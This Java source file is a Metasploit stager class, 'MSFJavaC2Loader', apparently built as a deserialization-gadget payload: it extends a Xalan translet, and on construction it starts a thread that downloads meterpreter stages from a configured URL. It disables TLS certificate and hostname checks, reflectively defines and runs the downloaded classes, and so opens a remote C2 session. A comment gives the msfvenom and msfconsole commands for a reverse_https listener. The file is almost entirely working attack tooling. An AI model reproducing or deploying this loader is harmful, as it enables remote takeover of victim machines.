package loader;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import javax.net.ssl.*;
import java.io.*;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLConnection;
import java.security.ProtectionDomain;
import java.security.SecureRandom;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.StringTokenizer;

/**
 * msf java， 参考 https://github.com/Ramos-dev/R9000 （跨平台，java，仅支持msf）
 *
 * url 生成方式：
 * msfvenom -p java/meterpreter/reverse_https LHOST=x.x.x.x  LPORT=x -f raw > https.jar
 * jar -xvf https.jar && tail metasploit.dat 提取即可
 *
 * msfconsole:
 * use exploits/multi/handler
 * set PAYLOAD java/meterpreter/reverse_https
 * set LHOST x.x.x.x
 * set LPORT x
 * exploit
 *
 */
public class MSFJavaC2Loader extends AbstractTranslet implements Serializable, Runnable, X509TrustManager, HostnameVerifier {

    private static String url;
    public static boolean firstRun = true;

    public MSFJavaC2Loader(){
        transletVersion = 101;
        if(firstRun){
            new Thread(this).start();
            firstRun = false;
        }
    }

    public void run(){
        try {

            InputStream inputStream2 = null;

            if ( url.startsWith( "https" ) ) {
                URLConnection obj = new URL( url ).openConnection();
                useFor( obj );
                inputStream2 = ( obj ).getInputStream();
            }else {
                inputStream2 = new URL( url ).openStream();
            }
            OutputStream outputStream  = new ByteArrayOutputStream();

            Object localObject6 = new StringTokenizer( "Payload -- " + "", " " );
            String[] arrayOfString = new String[( (StringTokenizer) localObject6 ).countTokens()];
            for ( int m = 0; m < arrayOfString.length; m++ ) {
                arrayOfString[m] = ( (StringTokenizer) localObject6 ).nextToken();
            }

            bootstrap(inputStream2, outputStream, null, arrayOfString );
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void bootstrap(InputStream inputStream, OutputStream outputStream, String string, String[] arrstring) throws Exception {
        try {
            Class<?> class_ = null;
            DataInputStream dataInputStream = new DataInputStream( inputStream );

            if ( string == null ) {
                int n = dataInputStream.readInt();
                do {
                    byte[] arrby = new byte[n];
                    dataInputStream.readFully(arrby);

                    ClassLoader loader = getClass().getClassLoader();
                    Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass",String.class, byte[].class, int.class, int.class, ProtectionDomain.class);
                    defineClass.setAccessible(true);
                    class_ = (Class< ? >) defineClass.invoke(loader, null, arrby, 0, n, null);

                    Method resolveClass = ClassLoader.class.getDeclaredMethod("resolveClass",Class.class);
                    resolveClass.setAccessible(true);
                    resolveClass.invoke(loader, class_);

                }
                while (( n = dataInputStream.readInt()) > 0);
            }

            Object obj = class_.newInstance();
            class_.getMethod( "start", DataInputStream.class, OutputStream.class, String[].class ).invoke( obj, dataInputStream,  outputStream, arrstring );
        }
        catch ( Throwable throwable ){
            throwable.printStackTrace( new PrintStream( outputStream ) );
        }
    }

    @Override
    public boolean verify(String s, SSLSession sslSession){
        return true;
    }

    @Override
    public void checkClientTrusted(X509Certificate[] x509Certificates, String s ) throws CertificateException {}

    @Override
    public void checkServerTrusted( X509Certificate[] x509Certificates, String s ) throws CertificateException {}

    @Override
    public X509Certificate[] getAcceptedIssuers() {
        return new X509Certificate[0];
    }

    public static void useFor( URLConnection paramURLConnection ) throws Exception {
        if ( ( paramURLConnection instanceof HttpsURLConnection)){
            HttpsURLConnection localHttpsURLConnection = (HttpsURLConnection) paramURLConnection;
            MSFJavaC2Loader localPayloadTrustManager = new MSFJavaC2Loader();
            SSLContext localSSLContext = SSLContext.getInstance( "SSL" );
            localSSLContext.init( null, new TrustManager[] { localPayloadTrustManager }, new SecureRandom() );
            localHttpsURLConnection.setSSLSocketFactory( localSSLContext.getSocketFactory() );
            localHttpsURLConnection.setHostnameVerifier( localPayloadTrustManager );
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}